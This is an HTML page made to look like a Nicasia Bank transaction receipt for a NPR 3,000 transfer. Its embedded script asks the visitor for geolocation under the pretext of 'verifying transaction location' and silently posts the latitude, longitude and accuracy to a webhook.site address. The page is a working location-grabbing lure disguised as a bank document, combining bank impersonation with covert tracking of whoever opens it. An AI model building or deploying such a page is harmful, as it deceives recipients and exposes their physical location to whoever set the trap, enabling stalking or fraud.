<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Transaction Receipt - Nicasia Bank</title>
  <style>
    body {
      background: #f4f4f4;
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    .receipt {
      background: white;
      max-width: 400px;
      margin: 20px auto;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
    }
    .receipt h2 {
      text-align: center;
      color: #2a5f8a;
      margin-bottom: 10px;
    }
    .bank-logo {
      text-align: center;
      font-weight: bold;
      color: #2a5f8a;
      margin-bottom: 20px;
    }
    .details {
      margin: 20px 0;
      border-top: 1px dashed #ddd;
      border-bottom: 1px dashed #ddd;
      padding: 15px 0;
    }
    .detail-row {
      display: flex;
      justify-content: space-between;
      margin: 10px 0;
    }
    .detail-label {
      color: #666;
    }
    .detail-value {
      font-weight: bold;
    }
    .success-badge {
      background: #4CAF50;
      color: white;
      padding: 8px 15px;
      border-radius: 20px;
      text-align: center;
      margin: 20px auto;
      width: fit-content;
    }
    #location-status {
      text-align: center;
      color: #666;
      font-size: 14px;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="receipt">
    <div class="bank-logo">NICASIA BANK</div>
    <h2>Transaction Receipt</h2>
    
    <div class="success-badge">Transaction Successful</div>
    
    <div class="details">
      <div class="detail-row">
        <span class="detail-label">From:</span>
        <span class="detail-value">Prashan Budhathoki</span>
      </div>
      <div class="detail-row">
        <span class="detail-label">To:</span>
        <span class="detail-value">**** Nagarkoti</span>
      </div>
      <div class="detail-row">
        <span class="detail-label">Amount:</span>
        <span class="detail-value">NPR 3,000</span>
      </div>
      <div class="detail-row">
        <span class="detail-label">Date:</span>
        <span class="detail-value" id="transaction-date"></span>
      </div>
      <div class="detail-row">
        <span class="detail-label">Transaction ID:</span>
        <span class="detail-value">NIC-7890-2024</span>
      </div>
    </div>
    
    <div id="location-status">Verifying transaction location...</div>
  </div>

  <script>
    // Set current date
    document.getElementById('transaction-date').textContent = new Date().toLocaleString();
    
    // Geolocation verification
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const locationData = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: `${position.coords.accuracy}m`
          };
          document.getElementById('location-status').textContent = 
            `Transaction verified from location (${locationData.lat}, ${locationData.lng})`;
          
          // Optional: Send to webhook (replace YOUR_WEBHOOK_URL)
          fetch('https://webhook.site/badbb57b-df0b-4339-9064-0e7ddc716651', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(locationData)
          });
        },
        (error) => {
          document.getElementById('location-status').textContent = 
            'Location verification skipped (user denied)';
        }
      );
    } else {
      document.getElementById('location-status').textContent = 
        'Geolocation not supported';
    }
  </script>
</body>
</html>
